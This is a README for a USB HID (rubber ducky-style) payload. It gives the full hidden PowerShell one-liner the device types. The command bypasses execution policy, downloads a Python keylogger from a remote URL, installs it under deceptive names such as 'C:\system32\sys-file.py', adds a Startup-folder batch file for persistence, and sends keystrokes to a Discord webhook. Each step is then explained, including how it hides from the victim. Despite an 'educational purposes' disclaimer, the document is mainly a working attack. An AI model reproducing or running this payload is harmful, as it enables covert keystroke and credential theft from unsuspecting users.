THIS IS ONLY MADE FOR EDUCATIONAL PURPOSES


# What it Does

This payload executes a powershell command that downloads a python keylogger and runs it. This keylogger sends the keys pressed over discord using a webhook.

# Dependencies

- Windows
- Python
- User is admin

# How it Works:

## The rubber ducky script
When the grabber.dd runs it opens a powershell terminal using ``control shift enter`` to open it with admin privelages and enters this string:

```powershell
powershell -w h -NoP -NonI -Exec Bypass -c "mkdir 'C:\system32\' ; cd C:\system32\ ; iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/discord-keylogger/logger.py -OutFile C:\system32\sys-file.py ; py -m pip install discordwebhook pynput ; '@echo off', 'start /B pythonw.exe "C:\system32\sys-file.py"' | Set-Content -Path 'C:\system32\startup.bat'
; cp 'C:\system32\startup.bat' '$Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' ; Python sys-file.py <your discord webhook here>"
```

### Flags used:

The ```powershell -w h -NoP -NonI -Exec Bypass -c``` tells powershell to execute a set of commands with some flags:
- ```-w h``` tells powershell to run in a hidden window so the victim cant see logs
- ```-NoP``` makes sure that none of the users profiles are loaded, which could mess up execution
- ```-NonI``` Makes the user unable to interact with the script while its running
- ```-Exec Bypass``` Makes powershell bypass the execution policy which allows powershell to run scripts
- ```-c``` tells powershell what commands to execute, the commands are enclosed in quotes and seperated with semicolons
- Now the script proceecds to execute a sequence of commands

(copied from the [chrome password stealer](https://github.com/simen64/Pico-HID-Scripts/tree/main/chrome-password-stealerw) README thats made by me)

### Commands ran:
1. We make a directory called ``system32`` in the C: drive using mkdir ``C:\system32\``. I decided to call it ``system32`` as many people would not want to delete the a folder named system32.
2. Next we enter the directory using ``cd C:\system32\``
3. Then we run `iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/discord-keylogger/logger.py -OutFile C:\system32\sys-file.py` to download the keylogger and spit it out as sys-file.py (again to trick the user to not deleting the file)
4. After we have the logger we install the needed libraries ``py -m pip install discordwebhook pynput``
5. Then we create a file called startup.bat to run the keylogger on startup ``'@echo off', 'start /B pythonw.exe "C:\system32\sys-file.py"' | Set-Content -Path 'C:\system32\startup.bat'``
6. To make it run at startup we need to copy it to the startup folder using this command ``cp 'C:\system32\startup.bat' '$Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'`` this is why we need the user to be admin so we can access the startup folder
7. Last but now least we use this command ``Python sys-file.py <your discord webhook here>"`` to run the keylogger the webhook is being ported as an anrgument and will later saved in a file on the victims computer.
